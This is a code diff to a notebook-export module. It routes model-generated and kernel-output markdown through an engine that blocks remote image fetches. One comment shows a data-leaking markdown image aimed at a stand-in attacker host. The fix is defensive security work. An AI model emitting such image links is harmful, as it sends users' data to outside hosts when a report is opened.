@@ -40,17 +40,35 @@ import MarkdownIt from 'markdown-it';
 import type { CellView, CellOutput } from './types';
 import { listCells, getHideAllCode, resolveNotebookPath } from './notebook';
 import { isCodeHidden } from '$lib/hideInput';
+import { noFetchImages } from '$lib/markdownNoFetch';
 
 /** The minimal markdown-it surface this module uses. */
 interface MarkdownRenderer {
 	render(src: string): string;
+	renderer: { rules: Record<string, unknown> };
 }
 
 // markdown-it in the same safe configuration Cell.svelte uses: `html:false`
 // escapes any raw HTML in the source into text, so notebook content cannot
 // inject markup into the exported file. That escaping is why this server-side
 // path needs no DOMPurify (which would require a DOM Cellar's backend lacks).
-const md: MarkdownRenderer = new MarkdownIt({ html: false, linkify: true, breaks: false });
+const newEngine = (): MarkdownRenderer => new MarkdownIt({ html: false, linkify: true, breaks: false });
+
+// The engine for AUTHORED markdown cells: the user's own content, unchanged.
+const md: MarkdownRenderer = newEngine();
+
+// The engine for MACHINE-EMITTED markdown - a model's chat reply under
+// `text/markdown`, and a markdown table found in kernel output text. It carries
+// the one shared no-fetch image rule (`$lib/markdownNoFetch`, which owns the
+// reasoning), because `html:false` escapes raw HTML but does NOT touch
+// markdown-it's own image rule: `![](https://attacker/?d=<data>)` renders as a
+// live `<img src>`, and in an exported report that beacon fires in every
+// READER's browser, not just the author's. The app's renderers install the same
+// rule; this module cannot share their sanitizer (it has no DOM), so the rule
+// is what keeps the two surfaces from drifting, and the unit tests pin both
+// against the same cases.
+const mdOutput: MarkdownRenderer = newEngine();
+noFetchImages(mdOutput);
 
 // Payloads arrive from nbformat MIME bundles (Record<string, unknown>), so the
 // coercion at this boundary is deliberate: a bundle value is normally a string
@@ -82,7 +100,8 @@ type OutputSegment = { type: 'text'; text: string } | { type: 'table'; html: str
 function renderTable(src: string): string {
 	// markdown-it emits a plain <table>; give it the same look the app applies via
 	// its daisyUI table classes by styling `.export-table table` in the stylesheet.
-	return md.render(src);
+	// Rendered with the OUTPUT engine: this table was found in kernel output.
+	return mdOutput.render(src);
 }
 
 /**
@@ -302,12 +321,13 @@ function renderOutput(o: CellOutput): string {
 			// the whole content of a chat cell (the reply Cellar itself persists under
 			// that mime), so a report that showed it as `**bold**` and `##` inside a
 			// <pre> would be showing markup where the app shows a rendered answer. It
-			// goes through this module's OWN markdown-it - `html:false`, so its output
-			// needs no sanitizer, and no KaTeX, which is this module's documented
-			// divergence from the app (`$…$` stays literal text here). Every other
-			// mime's priority is unchanged.
+			// goes through this module's OWN markdown-it - no KaTeX, which is this
+			// module's documented divergence from the app (`$…$` stays literal text
+			// here) - and specifically the OUTPUT engine, so nothing in a payload the
+			// user did not write fetches when a recipient opens the report. Every
+			// other mime's priority is unchanged.
 			if (d['text/markdown']) {
-				return `<div class="output-markdown cellar-md">${md.render(asText(d['text/markdown']))}</div>`;
+				return `<div class="output-markdown cellar-md">${mdOutput.render(asText(d['text/markdown']))}</div>`;
 			}
 			if (d['text/plain']) return renderOutputText('result', asText(d['text/plain']));
 			return `<pre class="output-text tone-result">[rich output]</pre>`;
